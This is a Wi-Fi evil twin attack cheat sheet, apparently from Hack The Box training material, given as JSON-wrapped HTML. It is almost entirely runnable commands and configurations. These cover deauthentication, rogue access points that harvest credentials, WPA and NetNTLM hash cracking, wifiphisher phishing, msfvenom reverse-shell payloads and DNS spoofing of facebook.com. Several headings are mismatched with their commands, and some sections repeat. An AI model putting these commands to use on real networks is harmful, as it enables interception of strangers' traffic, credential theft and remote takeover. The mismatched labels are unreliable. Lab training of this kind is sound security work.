{"title": "Wi-Fi Evil Twin Attacks", "source": "cheatsheet", "source_label": "Cheat Sheets", "path": "cheatsheet/wi-fi-evil-twin-attacks", "html": "<h1 id=\"wi-fi-evil-twin-attacks\">Wi-Fi Evil Twin Attacks</h1>\n<h4>Enumeration</h4>\n<h3 id=\"set-the-wlan0-interface-to-monitor-mode\">Set the wlan0 interface to monitor mode</h3>\n<pre><code class=\"language-bash\">sudo airmon-ng start wlan0</code></pre>\n<h3 id=\"scan-for-available-networks\">Scan for available networks</h3>\n<pre><code class=\"language-bash\">sudo airodump-ng wlan0mon</code></pre>\n<h3 id=\"scan-for-available-networks-on-channel-1-and-save-network-tr\">Scan for available networks on channel 1, and save network traffic to a file</h3>\n<pre><code class=\"language-bash\">sudo airodump-ng wlan0mon -w HTB -c 1</code></pre>\n<h3 id=\"deauthenticating-an-access-point\">Deauthenticating an access point.</h3>\n<pre><code class=\"language-bash\">sudo aireplay-ng --deauth 5 -a D4:C1:8B:79:AD:45 wlan0mon</code></pre>\n<h3 id=\"deauthenticating-a-specific-client-from-an-access-point\">Deauthenticating a specific client from an access point.</h3>\n<pre><code class=\"language-bash\">sudo aireplay-ng --deauth 5 -a D4:C1:8B:79:AD:45 -c 02:00:00:00:01:00 wlan0mon</code></pre>\n<h4>Deauthentication</h4>\n<h3 id=\"deauthenticating-an-access-point\">Deauthenticating an access point.</h3>\n<pre><code class=\"language-bash\">sudo aireplay-ng --deauth 5 -a D4:C1:8B:79:AD:45 wlan0mon</code></pre>\n<h3 id=\"deauthenticating-a-specific-client-from-an-access-point\">Deauthenticating a specific client from an access point.</h3>\n<pre><code class=\"language-bash\">sudo aireplay-ng --deauth 5 -a D4:C1:8B:79:AD:45 -c 02:00:00:00:01:00 wlan0mon</code></pre>\n<h4>Routing commands &amp; configuration</h4>\n<p><strong>DNS Config (dns.conf)</strong></p>\n<pre><code class=\"language-configuration\">interface=wlan1\ndhcp-range=&lt;target-ip&gt;,&lt;target-ip&gt;,255.255.255.0,10h\ndhcp-option=3,&lt;target-ip&gt;\ndhcp-option=6,&lt;target-ip&gt;\nserver=8.8.4.4\nserver=8.8.8.8\nlisten-address=127.0.0.1\naddress=/#/&lt;target-ip&gt;\nlog-dhcp\nlog-queries</code></pre>\n<h3 id=\"launch-the-dnsdhcp-service-with-our-conguration\">Launch the DNS/DHCP service with our conguration.</h3>\n<pre><code class=\"language-bash\">sudo dnsmasq -C dns.conf -d</code></pre>\n<h3 id=\"configure-valid-ip-address-for-the-network-interface-to-be-u\">Configure valid IP address for the network interface to be used to host the rogue AP.</h3>\n<pre><code class=\"language-bash\">sudo ifconfig wlan1 &lt;target-ip&gt;/24</code></pre>\n<h3 id=\"enable-ip-forwarding\">Enable IP forwarding</h3>\n<pre><code class=\"language-bash\">sudo sh -c &#x27;echo 1 &gt; /proc/sys/net/ipv4/ip\\_forward&#x27;</code></pre>\n<h3 id=\"shut-down-the-wlan1-interface\">Shut down the wlan1 interface.</h3>\n<pre><code class=\"language-bash\">sudo ifconfig wlan1 down</code></pre>\n<h3 id=\"assign-a-spoofed-mac-address-to-the-wlan1-interface\">Assign a spoofed MAC address to the wlan1 interface.</h3>\n<pre><code class=\"language-bash\">sudo macchanger -m D4:C1:8B:79:AD:44 wlan1</code></pre>\n<h3 id=\"start-the-wlan1-interface\">Start the wlan1 interface.</h3>\n<pre><code class=\"language-bash\">sudo ifconfig wlan1 up</code></pre>\n<h3 id=\"redirect-traffic-from-the-victim-to-our-attack-host\">Redirect traffic from the victim to our attack host</h3>\n<pre><code class=\"language-bash\">sudo dnsspoof -i wlan1</code></pre>\n<h3 id=\"enable-nat-masquerading\">Enable NAT masquerading</h3>\n<pre><code class=\"language-bash\">sudo iptables --append POSTROUTING --table nat --out-interface eth0 -j MASQUERADE</code></pre>\n<h3 id=\"accept-traffic-from-the-wlan0-interface\">Accept traffic from the wlan0 interface.</h3>\n<pre><code class=\"language-bash\">sudo iptables --append FORWARD --in-interface wlan0 -j ACCEPT</code></pre>\n<h4>Password Cracking</h4>\n<h3 id=\"converts-a-captured-wpa-handshake-into-a-pcap\">Converts a captured WPA handshake into a pcap.</h3>\n<pre><code class=\"language-bash\">hcxhash2cap --hccapx=handshake.hccapx -c handshake.pcap</code></pre>\n<h3 id=\"converts-the-pcap-to-a-hashcat-compatible-hash-format\">Converts the pcap to a Hashcat compatible hash format.</h3>\n<pre><code class=\"language-bash\">hcxpcapngtool handshake.pcap -o hash.22000</code></pre>\n<h3 id=\"cracking-wpawpa2-hash\">Cracking WPA/WPA2 hash.</h3>\n<pre><code class=\"language-bash\">hashcat -a 0 -m 22000 hash.22000 /opt/wordlist.txt --force</code></pre>\n<h3 id=\"cracking-netntlm-hash\">Cracking NetNTLM hash.</h3>\n<pre><code class=\"language-bash\">hashcat -m 5500 -a 0 Administrator::::54as5&lt;SNIP&gt;5s5:as65a4sd564d1a2s wordlist.dict</code></pre>\n<h4>Rogue Access Point Usage</h4>\n<h3 id=\"launching-a-wireless-access-point-with-hostapd-host-access-p\">Launching a wireless access point with hostapd (Host Access Point Daemon).</h3>\n<pre><code class=\"language-bash\">sudo hostapd hostapd.conf</code></pre>\n<h3 id=\"launching-hostapd-mana-a-modified-version-of-hostapd-optimiz\">Launching hostapd-mana, a modified version of hostapd optimized for rogue AP attacks and credential harvesting.</h3>\n<pre><code class=\"language-bash\">sudo hostapd-mana hostapd.conf</code></pre>\n<h3 id=\"sudo-hostapd-wp2-hostapdconf\">sudo hostapd-wp2 hostapd.conf</h3>\n<p>Launching hostapd-wpe, a modified version of hostapd designed to target WPA-2 Enterprise networks and EAP-based authentication methods.</p>\n<h4>Hostapd configurations (hostapd.conf)</h4>\n<p><strong>Open Network</strong></p>\n<pre><code class=\"language-configuration\">interface=wlan1\nhw_mode=g\nssid=HTB-Corp\nchannel=1\ndriver=nl80211</code></pre>\n<p><strong>Mana Loud</strong></p>\n<pre><code class=\"language-configuration\">interface=wlan1\ndriver=nl80211\nhw_mode=g\nchannel=1\nssid=Anything\nwpa=2\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP CCMP\nwpa_passphrase=Anything\n\n# Mana Configuration\nenable_mana=1\nmana_loud=1</code></pre>\n<p><strong>WPA2 Handshake Capture</strong></p>\n<pre><code class=\"language-configuration\">interface=wlan1\ndriver=nl80211\nhw_mode=g\nchannel=1\nssid=HackMe\nwpa=2\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP CCMP\nwpa_passphrase=anything\nmana_wpaout=handshake.hccapx</code></pre>\n<p><strong>Enterprise Rogue AP</strong></p>\n<pre><code class=\"language-configuration\"># 802.11 Options\ninterface=wlan1\nssid=HTB-Wireless\nchannel=1\nauth_algs=3\nwpa_key_mgmt=WPA-EAP\nwpa_pairwise=TKIP CCMP\nwpa=3\nhw_mode=g\nieee8021x=1\n\n# EAP Configuration\neap_server=1\neap_user_file=hostapd.eap_user\n\n# Certificates\n\nca_cert=ca.pem\nserver_cert=server.pem\nprivate_key=server-key.pem\nprivate_key_passwd=whatever\ndh_file=dh.pem\n\n# Hostapd-mana Edition\n# Remove comments and reload to activate\n#enable_mana=1\n#mana_loud=1\n#mana_credout=credentials.creds\n#mana_eapsuccess=1\n#mana_wpe=1</code></pre>\n<p><strong>EAP Method Negotiation \\[hostapd.eap\\_user\\]</strong></p>\n<pre><code class=\"language-configuration\">* PEAP,TTLS,TLS,MD5,GTC,FAST\n&quot;t&quot; TTLS-PAP,GTC,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAP &quot;challenge1234&quot; [2]</code></pre>\n\n<h2>Automated Evil Twin Attacks</h2>\n<h3>Wifiphisher</h3>\n<h3 id=\"ensures-that-wifi-interfaces-are-restored-and-ready-before-i\">Ensures that WiFi interfaces are restored and ready, before initiating an attack.</h3>\n<pre><code class=\"language-bash\">sudo systemctl restart NetworkManager</code></pre>\n<h3 id=\"launch-the-oauth-phishing-attack\">Launch the OAuth phishing attack.</h3>\n<pre><code class=\"language-bash\">wifiphisher --essid &quot;FREE WI-FI&quot; -p oauth-login -kB -kN</code></pre>\n<h3 id=\"launch-the-firmware-upgrade-phishing-attack\">Launch the firmware upgrade phishing attack.</h3>\n<pre><code class=\"language-bash\">wifiphisher -aI wlan0 -eI wlan1 -p firmware-upgrade --handshake-capture HTB-01.cap -kN</code></pre>\n<h3 id=\"generates-a-malicious-elf-file\">Generates a malicious ELF file.</h3>\n<pre><code class=\"language-bash\">msfvenom -p linux/x64/shell\\_reverse\\_tcp LHOST=10.0.0.1 LPORT=4444 -f elf &gt; shell.elf</code></pre>\n<h3 id=\"generates-a-malicious-portable-executable\">Generates a malicious Portable Executable.</h3>\n<pre><code class=\"language-bash\">msfvenom -p windows/x64/shell\\_reverse\\_tcp LHOST=10.0.0.1 LPORT=4444 -f exe &gt; shell.exe</code></pre>\n<h3 id=\"launch-the-plugin-update-phishing-attack\">Launch the plugin update phishing attack.</h3>\n<pre><code class=\"language-bash\">wifiphisher -aI wlan0 -eI wlan1 -p plugin\\_update --payload-path /home/wifi/shell.elf -kN</code></pre>\n<h3 id=\"starts-a-netcat-listener\">Starts a netcat listener.</h3>\n<pre><code class=\"language-bash\">nc -nvlp 4444</code></pre>\n<h4>EAPHammer</h4>\n<h3 id=\"creates-self-signed-certificates-for-the-rogue-ap\">Creates self-signed certificates for the rogue AP.</h3>\n<pre><code class=\"language-bash\">sudo /opt/eaphammer/eaphammer --cert-wizard</code></pre>\n<h3 id=\"launches-the-essid-stripped-rogue-ap\">Launches the ESSID-stripped rogue AP</h3>\n<pre><code class=\"language-bash\">sudo /opt/eaphammer/eaphammer -i wlan1 --auth wpa-eap --essid HTB-Wireless --creds --negotiate balanced --essid-stripping &#x27;\\\\x20&#x27;</code></pre>\n<p><strong>ESSID Stripping</strong></p>\n<h3 id=\"add-a-space-like-a-white-space-after-essid\">Add a space, like a white space after ESSID</h3>\n<pre><code class=\"language-bash\">\\x20</code></pre>\n<h3 id=\"for-null-after-essid-itll-omit-all-characters-after-it\">For NULL after ESSID, it&#x27;ll omit all characters after it</h3>\n<pre><code class=\"language-bash\">\\x00</code></pre>\n<h3 id=\"add-tab-after-essid\">Add tab after ESSID</h3>\n<pre><code class=\"language-bash\">\\t</code></pre>\n<h3 id=\"add-new-line-after-essid\">Add new line after ESSID</h3>\n<pre><code class=\"language-bash\">\\r</code></pre>\n<h3 id=\"for-a-enter-similar-to-r-after-essid\">For a enter, similar to &#x27;\\\\r&#x27; after ESSID</h3>\n<pre><code class=\"language-bash\">\\n</code></pre>\n<h2>MITM Attacks</h2>\n<h3>DNS Spoofing</h3>\n<h3 id=\"launch-wifipumpkin3\">Launch wifipumpkin3.</h3>\n<pre><code class=\"language-bash\">sudo wifipumpkin3</code></pre>\n<h3 id=\"set-the-wireless-interface-for-the-ap\">Set the wireless interface for the AP.</h3>\n<pre><code class=\"language-bash\">set interface wlan1</code></pre>\n<h3 id=\"set-the-ssid-for-the-ap\">Set the SSID for the AP.</h3>\n<pre><code class=\"language-bash\">set ssid HTB-Corp</code></pre>\n<h3 id=\"disable-the-proxy\">Disable the proxy.</h3>\n<pre><code class=\"language-bash\">set proxy noproxy</code></pre>\n<h3 id=\"exclude-the-dns-server\">Exclude the DNS server.</h3>\n<pre><code class=\"language-bash\">ignore pydns\\_server</code></pre>\n<h3 id=\"view-current-settings-configured-for-our-rogue-ap\">View current settings configured for our rogue AP.</h3>\n<pre><code class=\"language-bash\">ap</code></pre>\n<h3 id=\"display-available-modules-in-wifipumpkin3\">Display available modules in wifipumpkin3.</h3>\n<pre><code class=\"language-bash\">show</code></pre>\n<h3 id=\"select-the-dnsspoof-module\">Select the dns_spoof module.</h3>\n<pre><code class=\"language-bash\">use spoof.dns\\_spoof</code></pre>\n<h3 id=\"set-the-domains-to-be-spoofed\">Set the domain(s) to be spoofed.</h3>\n<pre><code class=\"language-bash\">set domains academy.hackthebox.com, &lt;facebook.com&gt;</code></pre>\n<h3 id=\"set-the-ip-address-that-dns-requests-will-be-redirected-to\">Set the IP address that DNS requests will be redirected to.</h3>\n<pre><code class=\"language-bash\">set redirectTo 10.0.0.1</code></pre>\n<h3 id=\"start-the-dns-spoof-attack\">Start the DNS spoof attack</h3>\n<pre><code class=\"language-bash\">start</code></pre>\n<h3 id=\"navigate-out-of-the-dnsspoof-configuration-and-back-to-the-w\">Navigate out of the dns\\_spoof configuration and back to the wifipumpkin3 console</h3>\n<pre><code class=\"language-bash\">back</code></pre>\n<h3 id=\"start-the-rogue-ap\">Start the rogue AP.</h3>\n<pre><code class=\"language-bash\">start</code></pre>\n<h3 id=\"start-the-rogue-ap\">Start the rogue AP.</h3>\n<pre><code class=\"language-bash\">start</code></pre>\n<h3 id=\"enable-the-first-virtual-host\">Enable the first virtual host.</h3>\n<pre><code class=\"language-bash\">sudo a2ensite intranet1.conf</code></pre>\n<h3 id=\"enable-the-second-virtual-host\">Enable the second virtual host.</h3>\n<pre><code class=\"language-bash\">sudo a2ensite intranet2.conf</code></pre>\n<h3 id=\"restart-apache-web-server\">Restart Apache web server.</h3>\n<pre><code class=\"language-bash\">sudo systemctl restart apache2</code></pre>\n<h3 id=\"if-necessary-perform-deauthentication-attack-to-force-victim\">If necessary, perform deauthentication attack to force victims to connect to the rogue AP.</h3>\n<pre><code class=\"language-bash\">sudo aireplay-ng --deauth 5 -a 9C:9A:03:39:BD:7A wlan0mon</code></pre>\n<h4>Virtual Host Configuration</h4>\n<p><strong>/etc/apache2/sites-available/intranet1.conf</strong></p>\n<pre><code class=\"language-configuration\">&lt;VirtualHost *:80&gt;\n    ServerAdmin admin@hackthebox.com\n    ServerName academy.hackthebox.com\n    ServerAlias www.academy.hackthebox.com\n    DocumentRoot /var/www/html\n    ErrorLog ${APACHE_LOG_DIR}/error.log\n    CustomLog ${APACHE_LOG_DIR}/access.log combined\n&lt;/VirtualHost&gt;</code></pre>\n<p><strong>/etc/apache2/sites-available/intranet2.conf</strong></p>\n<pre><code class=\"language-configuration\">&lt;VirtualHost *:80&gt;\n    ServerAdmin admin@facebook.com\n    ServerName facebook.com\n    ServerAlias www.facebook.com\n    DocumentRoot /var/www/html/facebook\n    ErrorLog ${APACHE_LOG_DIR}/error.log\n    CustomLog ${APACHE_LOG_DIR}/access.log combined\n&lt;/VirtualHost&gt;</code></pre>\n<h3 id=\"view-the-basic-help-menu\">View the basic help menu</h3>\n<pre><code class=\"language-bash\">sudo a2ensite intranet1.conf</code></pre>\n<h3 id=\"view-the-advanced-help-menu\">View the advanced help menu</h3>\n<pre><code class=\"language-bash\">sudo a2ensite intranet2.conf</code></pre>\n<h3 id=\"run-sqlmap-without-asking-for-user-input\">Run SQLMap without asking for user input</h3>\n<pre><code class=\"language-bash\">sudo systemctl restart apache2</code></pre>\n<h3>SSL Interception</h3>\n<h4>Routing Configuration</h4>\n<p><strong>dns.conf</strong></p>\n<pre><code class=\"language-configuration\">interface=wlan1\ndhcp-range=&lt;target-ip&gt;,&lt;target-ip&gt;,255.255.255.0,10h\ndhcp-option=3,&lt;target-ip&gt;\ndhcp-option=6,&lt;target-ip&gt;\nserver=8.8.4.4\nserver=8.8.8.8\nlisten-address=127.0.0.1\naddress=/#/&lt;target-ip&gt;\nlog-dhcp\nlog-queries</code></pre>\n<p><strong>hostapd.conf</strong></p>\n<pre><code class=\"language-configuration\">interface=wlan1\nhw_mode=g\nssid=HTB-Corp\nchannel=1\ndriver=nl80211</code></pre>\n<h3 id=\"configure-the-ip-address-for-the-interface-that-will-host-th\">Configure the IP address for the interface that will host the fake access point.</h3>\n<pre><code class=\"language-bash\">sudo ifconfig wlan1 &lt;target-ip&gt;/24</code></pre>\n<h3 id=\"start-the-dns-server\">Start the DNS server.</h3>\n<pre><code class=\"language-bash\">sudo dnsmasq -c dns.conf -d</code></pre>\n<h3 id=\"enable-ip-forwarding\">Enable IP forwarding.</h3>\n<pre><code class=\"language-bash\">sudo sh -c &#x27;echo 1 &gt; /proc/sys/net/ipv4/ip\\_forward&#x27;</code></pre>\n<h3 id=\"start-the-access-point\">Start the access point.</h3>\n<pre><code class=\"language-bash\">sudo hostapd hostapd.conf</code></pre>\n<h3 id=\"initiate-the-ssl-intercept-attack\">Initiate the SSL intercept attack</h3>\n<pre><code class=\"language-bash\">ettercap -T -q -M ARP -i wlan1</code></pre>", "excerpt": "Wi-Fi Evil Twin Attacks Enumeration Set the wlan0 interface to monitor mode sudo airmon-ng start wlan0 Scan for available networks sudo airodump-ng wlan0mon Scan for available networks on channel 1, a…", "tags": ["htb", "cheatsheet"]}